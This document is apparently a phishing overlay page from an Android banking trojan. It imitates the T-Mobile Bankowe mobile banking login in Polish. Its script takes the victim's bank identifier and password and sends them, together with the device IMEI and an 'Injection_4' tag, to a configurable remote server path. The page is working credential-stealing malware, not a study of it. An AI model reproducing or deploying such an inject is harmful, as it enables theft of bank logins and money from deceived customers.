<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/com.finanteq.finance.ca/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
        <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
    <div class="header">
        <img style="width: 48px;padding: 10px;margin-right: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAJFBMVEUAAAB95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+n328t1AAAAC3RSTlMAj79gn+/fMK+AcH2eFwUAAABISURBVEjH7ZS5DQAgDAMD4ff++zIAUFgC0fjqOylpbCYEQ4hO+QnIpI9C+rnK/+mj9ZWx9x1H/E5An8Q/reJ9UZ7ODD9kQtgECZ0H03zhdokAAAAASUVORK5CYII=">
        Zaloguj
        <img style="float: right;width: 48px;padding: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAM1BMVEUAAAB95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+l95+nb2U1HAAAAEHRSTlMAQCCAvxCPz+/fcDCfYK9QI1i/BAAAAPZJREFUSMftVEsWgyAMDH9Frbn/aYtWBGkM6KZdOBufmM9kBgPw4J8hRHusVBpXaCVbSm/RW06tkbFYwBqWjcMvOCbDdEigO53ExPq9D9SF72s9bBGwF7An+kQOA4Af7RRGiie0VlFPF+KXpweILTSpEKava+4r1UBqbpV0/JDXWYJiGO0YszOK05f+M0C/vxAmEA0EMgmisHfKfCCFPSa4IMuQXyxRmWHIVDuhdEgI3k1YS8hl1WUDzRm3XNd0E8+Nk8hAQovVPKODsMG0GXlR8x9opZz7Ymu/6ELBt6wBSS8Bbm1cXDPXF9n1VXljGd9Y9w9+gDcpNSd1YYcdUgAAAABJRU5ErkJggg==">
    </div>

    <form id="form">
        <label for="login">Identyfikator</label>
        <input type="text" class="input" name="login" id="login" required pattern="^(\w+){7}$" maxlength="7">

        <label for="password">Hasło</label>
        <input type="password" class="input" name="password" id="password">

        <input type="button" class="button" id="submitBtn1" value="Zaloguj">
    </form>



    <script type="text/javascript">
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 7) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 4) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        sentServer();
                    }
            </script>
<script>
    function sentServer(){

        var url='<?php echo $URL; ?>';
        var imei_c='<?php echo $IMEI_country; ?>';
        var login1 = document.getElementById('login').value;
        var pass = document.getElementById('password').value;

        location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|com_finanteq_finance_ca|"+login1+"|"+pass);

    }
</script>	    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>

</html>
